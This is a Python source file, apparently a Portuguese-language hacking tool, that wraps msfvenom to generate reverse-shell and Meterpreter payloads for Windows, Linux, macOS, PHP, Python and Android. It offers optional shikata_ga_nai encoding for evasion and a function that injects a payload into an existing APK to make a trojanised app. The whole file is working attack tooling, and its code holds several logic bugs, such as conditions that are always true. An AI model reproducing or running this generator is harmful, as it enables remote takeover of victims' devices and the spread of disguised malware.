from os import system, getcwd
from Data.Cores_lines import *
import os.path as sys
import os

lista = ['asp', 'dll', 'elf', 'exe', 'jsp', 'macho', 'msi',
         'msi-nouac', 'vbs', 'war']

t1 = 'windows/meterpreter/reverse_tcp'
t2 = 'windows/meterpreter/reverse_tcp_dns'
t3 = 'windows/meterpreter/reverse_http'
t4 = 'windows/meterpreter/reverse_https'
t5 = 'linux/x86/meterpreter/reverse_tcp'
t6 = 'php/meterpreter/reverse_tcp'
t7 = 'python/meterpreter/reverse_tcp'
t8 = 'python/meterpreter/reverse_http'
t9 = 'python/meterpreter/reverse_https'
t10 = 'osx/shell_reverse_tcp'
t11 = 'android/meterpreter/reverse_tcp'
t12 = 'android/meterpreter/reverse_http'
t13 = 'android/meterpreter/reverse_https'

lista_payloads = [t1, t2, t3, t4, t5, t6, t7, t8, t9, t10, t11, t12, t13]
android = [t11, t12, t13]
linux = [t5]
windows = [t1, t2, t3, t4]
python = [t7, t8, t9]
mac = [t10]
php = [t6]


def diretorio():
    pasta = getcwd()
    existe = sys.exists(f'{pasta}/Payload/')
    if not existe:
        os.mkdir('Payloads')


def gera_payloads(nome, formato, tipo=t1, ip='127.0.0.1', port='4444', local='Payloads/', encoder=False):
    diretorio()
    if formato == 'exe':
        form = formato
    elif formato == 'elf':
        form = formato
    elif formato == 'php':
        form = formato
    elif formato == 'py' or 'python':
        form = 'py'
    elif formato == 'macho':
        form = formato
    elif formato == 'msi' or 'msi-nouac':
        form = 'msi'
    elif formato == 'asp':
        form = formato
    elif formato == 'dll':
        form = formato
    elif formato == 'vbs':
        form = formato
    elif formato == 'war':
        form = formato
    elif formato == 'jsp':
        form = formato
    elif formato == 'apk':
        form = 'apk'

    if tipo == t11 or tipo == t11 or tipo == t12:
        form = 'apk'
        payload = system(f"msfvenom -p {tipo} LHOST={ip} LPORT={port} R > {local}{nome}.{form}")
        if payload == 1:
            print()
            print(f'     {branco}[{vermelho}ATENÇÃO !!!{branco}]{vermelho}  Algum erro ocorreu no processamento'
                  f' do comando : msfvenom -p {tipo} LHOST={ip} LPORT={port} R > {local}{nome}.{form}')
        else:
            print(f'     {branco}[{verde}+{branco}]{verde}  PAYLOAD CRIADO COM SUCESSO ! DIVIRTA-SE')
        exit()

    if tipo == t7 or tipo == t9 or tipo == 8:
        form = 'py'
        if not encoder:
            payload = system(f"msfvenom -p {tipo} LHOST={ip} LPORT={port} > {local}{nome}.{form}")
        else:
            payload = system(f"msfvenom -p {tipo} LHOST={ip} LPORT={port} -e x86/shikata_ga_nai > {local}{nome}.{form}")
        if payload == 1:
            print()
            print(f'     {branco}[{vermelho}ATENÇÃO !!!{branco}]{vermelho}  Algum erro ocorreu no processamento'
                  f' do comando : msfvenom -p {tipo} LHOST={ip} LPORT={port} > {local}{nome}.{form}')
        else:
            print(f'     {branco}[{verde}+{branco}]{verde}  PAYLOAD CRIADO COM SUCESSO ! DIVIRTA-SE')
        exit()
    
    if tipo == t6:
        form = 'php'
        if not encoder:
            payload = system(f"msfvenom -p {tipo} LHOST={ip} LPORT={port} > {local}{nome}.{form}")
        else:
            payload = system(f"msfvenom -p {tipo} LHOST={ip} LPORT={port} -e x86/shikata_ga_nai > {local}{nome}.{form}")
        if payload == 1:
            print()
            print(f'     {branco}[{vermelho}ATENÇÃO !!!{branco}]{vermelho}  Algum erro ocorreu no processamento'
                  f' do comando : msfvenom -p {tipo} LHOST={ip} LPORT={port} > {local}{nome}.{form}')
        else:
            print(f'     {branco}[{verde}+{branco}]{verde}  PAYLOAD CRIADO COM SUCESSO ! DIVIRTA-SE')
        exit()


    if not encoder:
        payload = system(f"msfvenom -p {tipo} LHOST={ip} LPORT={port} -f {formato} > {local}{nome}.{form}")
        if payload == 1:
            print()
            print(f'     {branco}[{vermelho}ATENÇÃO !!!{branco}]{vermelho}  Algum erro ocorreu no processamento'
                  f' do comando : msfvenom -p {tipo} LHOST={ip} LPORT={port} -f {formato} > {local}{nome}.{form}')
        else:
            print(f'     {branco}[{verde}+{branco}]{verde}  PAYLOAD CRIADO COM SUCESSO ! DIVIRTA-SE')
    else:
        payload = system(f'msfvenom -p {tipo} LHOST={ip} LPORT={port} -e x86/shikata_ga_nai -f {formato} > {local}{nome}.{form}')
        if payload == 1:
            print()
            print(f'     {branco}[{vermelho}ATENÇÃO !!!{branco}]{vermelho}  Algum erro ocorreu no processamento'
                  f' do comando : msfvenom -p {tipo} LHOST={ip} LPORT={port} -e x86/shikata_ga_nai -f {formato} >'
                  f' {local}{nome}.{form}')
        else:
            print(f'     {branco}[{verde}+{branco}]{verde}  PAYLOAD CRIADO COM SUCESSO ! DIVIRTA-SE')
    exit()


def fusao(nome, origem, ip='127.0.0.1', port='4444', local='Payloads/', payload=t11):
    tmp = system(f"msfvenom -p {payload} LHOST={ip} LPORT={port} -x {origem} -o {local}{nome}.apk")


